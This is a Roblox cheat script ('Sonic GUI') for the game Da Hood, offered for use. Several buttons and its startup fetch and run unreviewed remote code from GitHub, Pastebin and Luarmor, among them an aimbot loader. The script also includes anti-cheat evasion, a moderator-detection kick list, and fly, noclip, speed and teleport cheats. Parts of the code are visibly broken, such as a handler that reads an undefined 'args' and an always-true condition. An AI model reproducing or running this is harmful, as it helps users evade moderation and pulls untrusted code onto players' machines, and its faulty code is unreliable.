local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

OrionLib:MakeNotification({
	Name = "Sonic GUI",
	Content = "Thanks for using our script!",
	Image = "rbxassetid://4483345998",
	Time = 5
})




local Dahood = 2788229376 

if game.PlaceId ~= Dahood then
    game.Players.LocalPlayer:Kick("Something Error.")
end


   
--Functions

function ResetChar()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA('Accessory') then
            v.Handle:Destroy()
        end
    end
    for _,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Part") or v:IsA("MeshPart") then
            v:Remove()
        end
    end
end


function findtarget(target)
    for i,v in pairs(game.Players:GetChildren()) do
        if (string.sub(string.lower(v.Name),1,string.len(target))) == string.lower(target) then
            return v.Name
        end
    end
end


local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/qvrwd/etarry/main/libraries/notification/akalinotif"))()

-- Notif("Hi", 5)
function Notif(txt, time)
    
local Notify = NotifyLibrary.Notify
Notify({
	Title = "Sonic GUI",
	Description = txt,
	Duration = time
})

end



function Fling()
    for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if child:IsA'BasePart' then 
        child.CustomPhysicalProperties = PhysicalProperties.new(1, 1, 1, 1, 1) 
        end 
        end
    local BG = Instance.new('BodyGyro', game.Players.LocalPlayer.Character.Head)
    local BV = Instance.new('BodyVelocity', game.Players.LocalPlayer.Character.Head)
    BG.P = 9e4
    BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.CFrame = game.Players.LocalPlayer.Character.Head.CFrame
    BV.Velocity = Vector3.new(0, 0, 0)
    BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

    local BT = Instance.new("BodyThrust")
    BT.Parent = game.Players.LocalPlayer.Character.Head
    BT.Force = Vector3.new(9e5, 9e5, 9e5)
    BT.Location = game.Players.LocalPlayer.Character.Head.Position
end
function StopFling()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
			v:Destroy()
		end
    end
for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Velocity = Vector3.new(0,0,0)
				v.RotVelocity = Vector3.new(0,0,0)
			end
		end
end





function fuckyoux()
                if tostring(args[1]) == "BreathingHAMON" then
                    return
                elseif tostring(args[1]) == "TeleportDetect" then
                    return
                elseif tostring(args[1]) == "CHECKER_1" then
                    return
                elseif tostring(args[1]) == "CHECKER" then
                    return
                elseif tostring(args[1]) == "GUI_CHECK" then
                    return
                elseif tostring(args[1]) == "OneMoreTime" then
                    return
                elseif tostring(args[1]) == "checkingSPEED" then
                    return
                elseif tostring(args[1]) == "BANREMOTE" then
                    return
                elseif tostring(args[1]) == "PERMAIDBAN" then
                    return
                elseif tostring(args[1]) == "KICKREMOTE" then
                    return
                elseif tostring(args[1]) == "BR_KICKPC" then
                    return
                end
            end;

        
function fuckyoux2()
                while wait() do

                for i, v in pairs(game.Players:GetChildren()) do

                    if v.Name == ("Benoxa") or v.Name == ("iumu") or v.Name == ("Sherosama") or v.Name == ("JokeTheFool") or v.Name == ("Papa_Mbaye") or v.Name == ("NikoSenpai") or v.Name == ("AStrongMuscle") or v.Name == ("Greed_Ocean") or v.Name == ("Drxvzo") or v.Name == ("Luutyy") or v.Name == ("paxxythecreator") or v.Name == ("AfroDs") or v.Name == ("givkitheth") or v.Name == ("ITopStarI") or v.Name == ("iRenn") or v.Name == ("MarTheWise") or v.Name == ("Untold_Joke") or v.Name == ("MarkoSumisu") or v.Name == ("NatsuDBlaze") or v.Name == ("MoodJesus") or v.Name == ("Asuyia") or v.Name == ("POMPKUN") or v.Name == ("UziGarage") or v.Name == ("BeeTheKidd") or v.Name == ("qtCeleste") or v.Name == ("zakblak20") or v.Name == ("coreten") or v.Name == ("LegacyCross") or v.Name == ("Squov") then
                        game:GetService("Players").LocalPlayer:Kick("Admin Detected!")
                    end
                end
            end
        end
fuckyoux()
fuckyoux2()
-------------------------
anticheatbypasstp = false

if identifyexecutor() == "ScriptWare" or is_sirhurt_closure or issentinelclosure or is_synapse_function and syn and 'Synapse X' then

	lp = game:GetService("Players").LocalPlayer
	rs = game:GetService("RunService")

	loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()
	setfflag("HumanoidParallelRemoveNoPhysics", "False")
	setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
	rs:BindToRenderStep("w", Enum.RenderPriority.Camera.Value, function()
		if noclip == true then
			lp.Character:WaitForChild("Humanoid"):ChangeState(11)
			rs.RenderStepped:Wait()
		end
	end)

else

local FloatPart = Instance.new("Part", workspace)
FloatPart.Name = "FloatPart"
FloatPart.Transparency = 1
FloatPart.CanCollide = true
FloatPart.Anchored = true

game:GetService('RunService').Stepped:connect(function()
    if noclip == true then
        FloatPart.CFrame = game:GetService("Players").LocalPlayer.Character.LeftFoot.CFrame * CFrame.new(0.8, -0.78, 0)
    end
end)

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Touched:connect(function(obj)
  if noclip == true then
    if not obj.Name == "FloatPart" then
	    obj.CanCollide = false
    end
  end
end)

game:GetService("Players").LocalPlayer.Character.UpperTorso.Touched:connect(function(obj)
  if noclip == true then
    if not obj.Name == "FloatPart" then
	    obj.CanCollide = false
    end
  end
end)


end
--------------------------

function buy2(item)
	local plr = game.Players.LocalPlayer
	local item = item -- buy name
	local itemname = itemname -- name in inventory
	
	if game.Players.LocalPlayer.Backpack:FindFirstChild(itemname) then  
	   Notif("You already have this item", 10)
	else
	
	saveposbuyingtool = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
	
	repeat wait()
	   plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop[item].Head.CFrame
	   fireclickdetector(game.Workspace.Ignored.Shop[item].ClickDetector)
	until game.Players.LocalPlayer.Backpack:FindFirstChild(itemname)
	
	wait()
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saveposbuyingtool)
	
	end
	end
	
	
	-- yeah fr
	if sethiddenproperty then -- good executors only thing
	
	local BuyingItem = false
	local function buy(name, itemname, price)
	
	if game.Players.LocalPlayer.Backpack:FindFirstChild(itemname) then
	   Notif("You already have this item", 10)
	elseif game.Players.LocalPlayer.DataFolder.Currency.Value <= price then
		Notif("You do not have enough money to buy this")
	else
	
	local OldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Ignored.Shop[name].Head.CFrame
	task.wait(0.08)
	BuyingItem = true
	task.wait()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldCFrame
	wait(.15)
	fireclickdetector(workspace.Ignored.Shop[name].ClickDetector)
	BuyingItem = false
	end
	end
	
	game:GetService('RunService').Heartbeat:Connect(function()
	if BuyingItem == true then
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA('BasePart') then
			sethiddenproperty(v,"NetworkIsSleeping",true)
		end
	end
	end
	
	
	end)
	
	else
	
	function buy(item, itemname, price)
	local plr = game.Players.LocalPlayer
	local item = item -- buy name
	local itemname = itemname -- name in inventory
	
	if game.Players.LocalPlayer.Backpack:FindFirstChild(itemname) then
	   Notif("You already have this item", 10)
	elseif game.Players.LocalPlayer.DataFolder.Currency.Value <= price then
		Notif("You do not have enough money to buy this")
	else
	
	saveposbuyingtool = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
	
	repeat wait()
	   plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop[item].Head.CFrame
	   fireclickdetector(game.Workspace.Ignored.Shop[item].ClickDetector)
	until game.Players.LocalPlayer.Backpack:FindFirstChild(itemname)
	
	wait()
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saveposbuyingtool)
	
	end
	end
	
	
	end -- yeah
	
	function ammo(item, itemname)
	local plr = game.Players.LocalPlayer
	local item = item -- buy name
	
	saveposbuyingtool = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
	
	
	plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop[item].Head.CFrame
	wait(.2)
	for i = 1, BuyAmmount do
		fireclickdetector(game.Workspace.Ignored.Shop[item].ClickDetector)
		wait(.8)
	end
	
	
	wait()
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saveposbuyingtool)
	
	end
	
	game:GetService('RunService').Stepped:connect(function()
	  if game.Players.LocalPlayer.Character.BodyEffects["K.O"].Value == true then
		noclip = false
	  end
	end)

--------------------------

local UserInputService = game:GetService("UserInputService")

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
	loadstring(game:HttpGet("https://pastebin.com/raw/e5QGAcL5", true))()
	print("Mobile device detected, executing menu tool.")
end

if UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
	print("PC Detected")
end

local Window = OrionLib:MakeWindow({Name = "Sonic GUI", HidePremium = true, SaveConfig = false, ConfigFolder = "AriesGUI", IntroText = "Sonic GUI", IntroIcon = "https://gcdnb.pbrd.co/images/JcK3Vwv7voQM.png", Icon = "https://gcdnb.pbrd.co/images/JcK3Vwv7voQM.png"})

--Home Tab--

local HomeTab = Window:MakeTab({
	Name = "Home",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local player = game.Players.LocalPlayer

HomeTab:AddLabel("Script Owner: xpython01 (discord) ")
HomeTab:AddLabel("Script Developer: xpython01")
HomeTab:AddLabel("Username: " .. player.Name)
HomeTab:AddLabel("Executor: " ..identifyexecutor())

HomeTab:AddButton({
	Name = "Copy Discord Link",
	Callback = function()
	setclipboard("https://discord.com/invite/HvvsbpVz7d")
	OrionLib:MakeNotification({
		Name = "Sonic Gui",
		Content = "Discord link copied to your clipboard.",
		Image = "rbxassetid://4483345998",
		Time = 5
	})
    end
})


HomeTab:AddButton({
	Name = "Redirect To Discord",
	Callback = function()
		if identifyexecutor() == "ScriptWare" or is_sirhurt_closure or issentinelclosure or is_synapse_function and syn and 'Synapse X' then
            local a = {
                ["cmd"] = "INVITE_BROWSER",
                ["args"] = {
                    ["code"] = "9TNjuM8D9X"
                },
                ["nonce"] = game:GetService("HttpService"):GenerateGUID(true)
            }

            local http_request = syn.request or http_request or request

            http_request(
                {
                    Url = "http://127.0.0.1:6463/rpc?v=1",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["Origin"] = "https://discord.com"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(a)
                }
            )
else
    
    OrionLib:MakeNotification({
		Name = "Sonic GUI",
		Content = "Your executor cannot Redirect To Discord! You must copy the discord invite link.",
		Image = "rbxassetid://4483345998",
		Time = 5
	})
end
end
})

------- Main Tab

local MainTab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})



flyenabled = false
MainTab:AddButton({
	Name = "Fly(X)",
	Callback = function()
		if flyenabled == true then
			Notif("Fly already enabled!", 5)
			return
		  end
		  flyenabled = true
		  
		   Notif("Press X to fly", 10)
		  
		  function Flyv1()
		  flyspeedXD = 20
					  if workspace:FindFirstChild("Core") then
		  workspace:FindFirstChild("Core"):Destroy()
				  end
			  flying = false
					  if game.Players.LocalPlayer.Character.Humanoid.PlatformStand == true then
			  game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
				  end
		  if xd1 then
		  xd1:Disconnect()
		  end
		  if xd2 then
		  xd2:Disconnect()
		  end
		  if xd3 then
		  xd3:Disconnect()
		  end
		  if xd4 then
		  xd4:Disconnect()
		  end
		  for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			  if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
				  v:Destroy()
			  end
		  end
		  local plr = game.Players.LocalPlayer
		  local mouse = plr:GetMouse()
		   
				  localplayer = plr
				 
				  if workspace:FindFirstChild("Core") then
					  workspace.Core:Destroy()
				  end
				 
				  local Core = Instance.new("Part")
				  Core.Name = "Core"
				  Core.Size = Vector3.new(0.05, 0.05, 0.05)
				  localplayer.Character:FindFirstChildWhichIsA("Humanoid").Died:Connect(function()
				  Core:Destroy()
				  end)
				  spawn(function()
					  Core.Parent = workspace
					  local Weld = Instance.new("Weld", Core)
					  Weld.Part0 = Core
					  Weld.Part1 = localplayer.Character.LowerTorso
					  Weld.C0 = CFrame.new(0, 0, 0)
				  end)
				 
				  workspace:WaitForChild("Core")
				 
				  local torso = workspace.Core
				  flying = true
				  local keys={a=false,d=false,w=false,s=false}
				  local e1
				  local e2
				  local function start()
					  local pos = Instance.new("BodyPosition",torso)
					  local gyro = Instance.new("BodyGyro",torso)
					  pos.Name="EPIXPOS"
					  pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
					  pos.position = torso.Position
					  gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					  gyro.cframe = torso.CFrame
					  repeat
						  wait()
						  localplayer.Character.Humanoid.PlatformStand=true
						  local new=gyro.cframe - gyro.cframe.p + pos.position
						  if keys.w then
							  new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * flyspeedXD
							  flyspeedXD=flyspeedXD+0
						  end
						  if keys.s then
							  new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * flyspeedXD
							  flyspeedXD=flyspeedXD+0
						  end
						  if keys.d then
							  new = new * CFrame.new(flyspeedXD,0,0)
							  flyspeedXD=flyspeedXD+0
						  end
						  if keys.a then
							  new = new * CFrame.new(-flyspeedXD,0,0)
							  flyspeedXD=flyspeedXD+0
						  end
						  pos.position=new.p
						  if keys.w then
							  gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(flyspeedXD*0),0,0)
						  elseif keys.s then
							  gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(flyspeedXD*0),0,0)
						  else
							  gyro.cframe = workspace.CurrentCamera.CoordinateFrame
						  end
					  until flying == false
					  if gyro then gyro:Destroy() end
					  if pos then pos:Destroy() end
					  flying=false
					  localplayer.Character.Humanoid.PlatformStand=false
				  end
				  e1=mouse.KeyDown:connect(function(key)
					  if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
					  if key=="w" then
						  keys.w=true
					  elseif key=="s" then
						  keys.s=true
					  elseif key=="a" then
						  keys.a=true
					  elseif key=="d" then
						  keys.d=true
					  elseif key== "x" then
						  if flying==true then
							  flying=false
						  else
							  flying=true
							  start()
						  end
					  end
				  end)
				  e2=mouse.KeyUp:connect(function(key)
					  if key=="w" then
						  keys.w=false
					  elseif key=="s" then
						  keys.s=false
					  elseif key=="a" then
						  keys.a=false
					  elseif key=="d" then
						  keys.d=false
					  end
				  end)
			  end
		  
		  Flyv1()
		  game.Players.LocalPlayer.CharacterAdded:connect(function()
			  game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
			  wait(1)
			  Flyv1()
		  end)
		  end
})

MainTab:AddSlider({
	Name = "Fly Speed",
	Min = 1,
	Max = 200,
	Default = 7,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Speed",
	Callback = function(val)
    flyspeedXD = val
end
})

MainTab:AddButton({
	Name = "Mobile Fly",
	Callback = function()
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
	loadstring(game:HttpGet("https://pastebin.com/raw/j6Uj7iwn"))()
	else
		Notif("You are not playing on a mobile device.", 10)
	end
end	
})

MainTab:AddButton({
	Name = "Kawai Bypass - Chat Bypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass", true))()
	end
})

MainTab:AddButton({
	Name = "Aimbot (Pc/Mobile)",
	Callback = function()
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/eeefb226604dc3bcf263854861594f38.lua"))()
	end
})



MainTab:AddButton({
	Name = "Broken Bones",
	Callback = function()
        for i,v in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v.Name == "RightElbow" or v.Name == "RightKnee" or v.Name == "RightAnkle" or v.Name == "RightWrist" or v.Name == "RightElbow" or v.Name == "RightShoulder" or "LeftElbow" or v.Name == "LeftKnee" or v.Name == "LeftAnkle" or v.Name == "LeftWrist" or v.Name == "LeftElbow" or v.Name == "LeftShoulder" or v.Name == "Neck" then
                if v:IsA("Motor6D") and v.Name ~= "Root" and v.Name ~= "Waist" then
                    v:Destroy()
                end
            end
        end
end	
})


MainTab:AddButton({
	Name = "Mask Names",
	Callback = function()
        for i,v in pairs(game.Workspace.Players:GetChildren()) do
            v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
        end
end	
})


MainTab:AddButton({
	Name = "Anti Fling",
	Callback = function()
        for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if child:IsA("BasePart") then
            child.CustomPhysicalProperties = PhysicalProperties.new(9e110,9e110,9e110)
               end
            end      
end	
})


MainTab:AddButton({
	Name = "Anti Mod",
	Callback = function()
        pcall(function()
            while wait() do
                for i, v in pairs(game.Players:GetChildren()) do
                    if v.Name == ("Benoxa") or v.Name == ("iumu") or v.Name == ("Sherosama") or v.Name == ("JokeTheFool") or v.Name == ("Papa_Mbaye") or v.Name == ("NikoSenpai") or v.Name == ("AStrongMuscle") or v.Name == ("Greed_Ocean") or v.Name == ("Drxvzo") or v.Name == ("Luutyy") or v.Name == ("paxxythecreator") or v.Name == ("AfroDs") or v.Name == ("givkitheth") or v.Name == ("ITopStarI") or v.Name == ("iRenn") or v.Name == ("MarTheWise") or v.Name == ("Untold_Joke") or v.Name == ("MarkoSumisu") or v.Name == ("NatsuDBlaze") or v.Name == ("MoodJesus") or v.Name == ("Asuyia") or v.Name == ("POMPKUN") or v.Name == ("UziGarage") or v.Name == ("BeeTheKidd") or v.Name == ("qtCeleste") or v.Name == ("zakblak20") or v.Name == ("coreten") or v.Name == ("LegacyCross") or v.Name == ("Squov") then
                        game:GetService("Players").LocalPlayer:Kick("Admin Detected!")
                    end
                end
            end
        end)
end	
})


MainTab:AddButton({
	Name = "Get Tools",
	Callback = function()
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
        for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
            if i.Name == "Part" then
                if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame;
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
                        wait()
                    end
                end
            end
        end;
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
end	
})

MainTab:AddButton({
	Name = "Teleport (L)",
	Callback = function()
    	plr = game.Players.LocalPlayer
	hum = plr.Character.HumanoidRootPart
	mouse = plr:GetMouse()

	mouse.KeyDown:connect(function(key)
		if key == "l" then
			if mouse.Target then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			end
		end
	end)
end	
})



MainTab:AddButton({
	Name = "Auto Pick",
	Callback = function()
    while wait() do
    for _,v in pairs(game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
        if v:IsA('Part') then
            if (v.Position - game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position).Magnitude <= 12 then
                wait(0.01);
                fireclickdetector(v:FindFirstChildOfClass('ClickDetector'));
            end;
        end;
    end;
end;
end	
})


MainTab:AddButton({
    Name = "Disappear (Cheater Attack)",
    Callback = function()
        Notif("Wait For 3 Sec..")
        wait(3)
        
        local player = game:GetService('Players').LocalPlayer
        local humanoidRootPart = player.Character.HumanoidRootPart
        
        -- Adjust the Y-coordinate to a very high value
        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, 10000000000000000, humanoidRootPart.Position.Z)
    end
})


MainTab:AddButton({
    Name = "No Fog",
    Callback = function()
        local lighting = game:GetService("Lighting")
        if lighting.FogEnd == 500 then
            lighting.FogEnd = 5000
        else
            lighting.FogEnd = 500
        end
    end
})




MainTab:AddButton({
	Name = "Flyv2(Q)",
	Callback = function()
    repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Head
	local flying = false
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 5000
	local speed = 5000
	function Fly()
		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
			if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
				speed = speed+.0+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
				speed = speed-5
				if speed > 5 then
					speed = -2
				end
			end
			if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 5
		bg:Destroy()
		bv:Destroy()
		plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
		if key:lower() == "q" then
			if flying then flying = false
			else
				flying = true
				Fly()
			end
		elseif key:lower() == "w" then
			ctrl.f = 20
		elseif key:lower() == "s" then
			ctrl.b = -20
		elseif key:lower() == "a" then
			ctrl.l = -20
		elseif key:lower() == "d" then
			ctrl.r = 20
		end
	end)
	mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
			ctrl.f = 0
		elseif key:lower() == "s" then
			ctrl.b = 0
		elseif key:lower() == "a" then
			ctrl.l = 0
		elseif key:lower() == "d" then
			ctrl.r = 0
		end
	end)
	Fly()
end	
})

MainTab:AddButton({
	Name = "Super Speed(C)",
	Callback = function()
		Notif("Keybind is 'C'", 10)
	superhuman = false
	plr = game.Players.LocalPlayer
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(key)
		if key == "c" and superhuman == false then
			superhuman = true
			game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
			game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
		elseif key == "c" and superhuman == true then
			superhuman = false
			game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
			game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
		end
	end)
end
})

MainTab:AddButton({
	Name = "Unjail",
	Callback = function()
		buy("[Key] - $133", "[Key]", 133)
	if game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]") then
        game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]").Parent = game.Players.LocalPlayer.Character
	end
	wait(.5)
	game.Players.LocalPlayer.Character:FindFirstChild('[Key]'):Activate()
	wait(.5)
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.2906494140625, 80.41372680664062, -210.28460693359375)
end
})



MainTab:AddButton({
    Name = "Heal",
    Callback = function()
        buy("[Taco] - $2", "[Taco]", 2)
        if game.Players.LocalPlayer.Backpack:FindFirstChild("[Taco]") then
            game.Players.LocalPlayer.Backpack:FindFirstChild("[Taco]").Parent = game.Players.LocalPlayer.Character
        end
        wait(0.5)
        local taco = game.Players.LocalPlayer.Character:FindFirstChild("[Taco]")
        if taco then
            while true do
                taco:Activate()
                wait(0.5)
                taco:Deactivate()
            end
        end
    end
})





MainTab:AddButton({
    Name = "Autosave",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local humanoid = character:WaitForChild("Humanoid")

        local teleportPosition = CFrame.new(-129.534, 27.842, -113.062)
        local damageThreshold = 40

        humanoid.HealthChanged:Connect(function(health)
            if health <= damageThreshold then
                humanoidRootPart.CFrame = teleportPosition
            end
        end)
    end
})

MainTab:AddButton({
    Name = "AutoHeal",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

        local damageThreshold = 40

        humanoid.HealthChanged:Connect(function(health)
            if health <= damageThreshold then
				buy("[Taco] - $2", "[Taco]", 2)
				if game.Players.LocalPlayer.Backpack:FindFirstChild("[Taco]") then
					game.Players.LocalPlayer.Backpack:FindFirstChild("[Taco]").Parent = game.Players.LocalPlayer.Character
				end
				wait(0.5)
				local taco = game.Players.LocalPlayer.Character:FindFirstChild("[Taco]")
				if taco then
					while true do
						taco:Activate()
						wait(0.5)
						taco:Deactivate()
					end
				end				
            end
        end)
    end
})

-- Code to buy and use ta



MainTab:AddButton({
    Name = "Lowgfx",
    Callback = function()
        local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
        local g = game
        local w = g.Workspace
        local l = g.Lighting
        local t = w.Terrain

        t.WaterWaveSize = 0
        t.WaterWaveSpeed = 0
        t.WaterReflectance = 0
        t.WaterTransparency = 0

        l.GlobalShadows = false
        l.FogEnd = 9e9
        l.Brightness = 0

        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

        for i, v in pairs(g:GetDescendants()) do
            if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                v.Material = Enum.Material.Plastic
                v.Reflectance = 0
            elseif v:IsA("Decal") and decalsyeeted then
                v.Transparency = 1
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Lifetime = NumberRange.new(0)
            elseif v:IsA("Explosion") then
                v.BlastPressure = 1
                v.BlastRadius = 1
            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                v.Enabled = false
            elseif v:IsA("MeshPart") then
                v.Material = Enum.Material.Plastic
                v.Reflectance = 0
                v.TextureID = "http://www.roblox.com/asset/?id=10385902758728957"
            end
        end

        for i, e in pairs(l:GetChildren()) do
            if e:IsA("PostEffect") then
                e.Enabled = false
            end
        end

        print("Low Gfx Enabled!")
    end
})




MainTab:AddButton({
    Name = "Force Reset",
    Callback = function()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v:Destroy()
            end
        end
    end
})


local FunTab = Window:MakeTab({
	Name = "Fun",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

FunTab:AddButton({
	Name = "Spiderman",
	Callback = function()
		local OriginalKeyUpValue = 0;
local Cooldown = false;

function AddVelocity(Vel, Char)
    Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity + Vel
end

local Grapple = Instance.new('Animation');
Grapple.AnimationId = 'rbxassetid://3135389157';

local Swing = Instance.new('Animation');
Swing.AnimationId = 'rbxassetid://3135793091';

local Glide = Instance.new("Animation")
Glide.AnimationId = 'rbxassetid://3136090876';

function StopAudio()
    game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND'):Stop();
end;

function Stop(i, v)
    local w = coroutine.wrap(function()
        wait(game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').TimeLength - 0.1)
